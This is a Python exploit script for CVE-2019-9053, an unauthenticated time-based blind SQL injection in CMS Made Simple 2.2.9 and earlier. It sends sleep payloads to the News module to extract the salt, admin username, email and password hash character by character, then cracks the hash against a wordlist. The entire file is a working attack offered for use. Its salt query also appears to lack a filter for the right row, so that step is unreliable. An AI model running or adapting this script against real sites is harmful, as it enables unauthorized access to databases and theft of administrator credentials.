#!/usr/bin/env python3
# CVE-2019-9053 â€“ CMS Made Simple <= 2.2.9 Unauthenticated SQL Injection
# Python3 fixed version

import requests
import time
import argparse
import hashlib
import os

from termcolor import cprint

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help="Base target URI (ex: http://10.10.10.100/cms)", required=True)
parser.add_argument("-w", "--wordlist", help="Wordlist for cracking the admin password")
parser.add_argument("-c", "--crack", action="store_true", help="Crack password using wordlist")

options = parser.parse_args()

url_vuln = options.url.rstrip("/") + "/moduleinterface.php?mact=News,m1_,default,0"
session = requests.Session()

dictionary = "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@._-$"
TIME = 1

password = ""
salt = ""
username = ""
email = ""

output = ""
flag = True


def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")


def beautify_print_try(value):
    clear_screen()
    cprint(output, 'green', attrs=['bold'])
    cprint(f"[*] Try: {value}", 'red', attrs=['bold'])


def beautify_print():
    clear_screen()
    cprint(output, 'green', attrs=['bold'])


def dump_field(field_name, table, where_field, result_holder):
    global flag, output

    current = result_holder
    hex_current = ""

    while flag:
        flag = False
        for ch in dictionary:
            test_val = current + ch
            test_hex = hex_current + ch.encode().hex()

            beautify_print_try(test_val)

            payload = (
                f"a,b,1,5))+and+(select+sleep({TIME})+from+{table}"
                f"+where+{where_field}+like+0x{test_hex}25)+--+"
            )

            url = f"{url_vuln}&m1_idlist={payload}"
            start_time = time.time()
            session.get(url)
            elapsed = time.time() - start_time

            if elapsed >= TIME:
                current = test_val
                hex_current = test_hex
                flag = True
                break

    output_msg = f"[+] {field_name} found: {current}"
    output += "\n" + output_msg
    cprint(output_msg, "green")
    flag = True

    return current


def crack_password(salt, password, wordlist):
    global output

    if not wordlist:
        print("[-] No wordlist provided.")
        return

    try:
        with open(wordlist, "r", errors="ignore") as f:
            for word in f:
                word = word.strip()
                beautify_print_try(word)

                if hashlib.md5((salt + word).encode()).hexdigest() == password:
                    found_msg = f"[+] Password cracked: {word}"
                    output += "\n" + found_msg
                    return word

    except FileNotFoundError:
        print("[-] Wordlist not found.")
        return None

    print("[-] Password not cracked.")
    return None


# -------- EXECUTION ----------

salt = dump_field("Salt", "cms_siteprefs", "sitepref_value", "")
username = dump_field("Username", "cms_users", "username", "")
email = dump_field("Email", "cms_users", "email", "")
password = dump_field("Password", "cms_users", "password", "")

if options.crack and options.wordlist:
    cprint("[*] Cracking password...", "yellow")
    crack_password(salt, password, options.wordlist)

beautify_print()
